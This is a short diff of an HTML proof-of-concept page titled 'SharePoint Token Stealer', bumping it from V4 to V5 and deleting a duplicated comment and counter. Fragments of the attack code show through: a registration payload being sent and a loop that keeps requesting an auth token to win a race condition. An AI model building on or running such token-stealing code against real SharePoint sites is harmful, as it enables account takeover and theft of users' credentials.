@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SharePoint PoC V4</title>
+    <title>SharePoint PoC V5</title>
 </head>
 <body>
     <h1>SharePoint Token Stealer</h1>
@@ -39,8 +39,6 @@
             send(registerPayload);
             console.log("Sent registration (Dual Format)");
 
-            // 2. Request Auth Token (Repeated attempts to catch race conditions)
-            let attempts = 0;
             // 2. Request Auth Token (Repeated attempts to catch race conditions)
             let attempts = 0;
             const interval = setInterval(() => {
